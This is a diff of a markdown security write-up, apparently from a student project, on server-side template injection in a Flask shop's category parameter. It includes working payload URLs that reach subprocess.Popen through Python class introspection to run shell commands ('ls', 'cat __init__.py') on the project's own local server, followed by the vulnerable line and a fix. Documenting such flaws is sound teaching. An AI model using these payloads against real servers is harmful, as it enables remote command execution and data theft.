@@ -32,7 +32,39 @@ In here we have access to something we probably shouldnt have, namely 'SECRET_KE
 
 ![image](https://github.com/uTigas/SIOProject_1/assets/125353199/3b00e088-2795-453d-ae84-925a4d0c3d28)
 
-What happened here is that we are running this piece of code ```dict.__base__.__subclasses__()```. ```dict``` is a class and ```dict.__base__``` returns the base class of ```dict``` which is ```Object```. Then we basicly do ```Object.subclasses()``` which returns a list of all classes ( since all classes come from the ```Object``` class). But this has give us the opportunity to access hundreds of new classes and functions in those classes.
+What happened here is that we are running this piece of code ```dict.__base__.__subclasses__()```. ```dict``` is a class and ```dict.__base__``` returns the base class of ```dict``` which is ```Object```. Then we basicly do ```Object.subclasses()``` which returns a list of all classes ( since all classes come from the ```Object``` class). And this has give us the opportunity to access hundreds of new classes and functions in those classes , and have some fun with them. ```{{dict.__base__.__subclasses__()[351]}}``` is gonna give us ```<class 'subprocess.Popen'>``` which spawn some process. ( the index to find this class may vary )
+
+```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category={{dict.__base__.__subclasses__()[351](%22ls%20%22,shell=True,stdout=-1).communicate()[0].strip()}}```
+
+Lists the file on the directory with ```ls```.
+
+![image](https://github.com/uTigas/SIOProject_1/assets/125353199/0d2e307a-cb52-4064-af3a-f7c59ddf43f7)
+
+```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category={{dict.__base__.__subclasses__()[351](%22cat%20__init__.py%22,shell=True,stdout=-1).communicate()[0].strip()}}```
+
+Shows the contents of ```__init__.py``` which is source code of our website.
+
+![image](https://github.com/uTigas/SIOProject_1/assets/125353199/b29ae7e0-eeb9-423e-861a-06937e28156c)
+
+At this point we have access to ```bash``` commands and we can go some damage to the server.
+
+## Weak code
+
+![image](https://github.com/uTigas/SIOProject_1/assets/125353199/f18d3a42-f402-4011-a008-cafd5530d711)
+
+On this line we are calling rendering category as a template but we never check if category is safe to parse.
+
+## Fix 
+
+- Category shouldnt be rendered as a template it should be only treated as text to inject in some template never a template.
+
+![image](https://github.com/uTigas/SIOProject_1/assets/125353199/f427b211-2250-44d1-a925-e07b80728718)
+
+- We if we really need to render Category has a template we could also validade that category is something safe to render. 
+
+
+
+
 
 
 
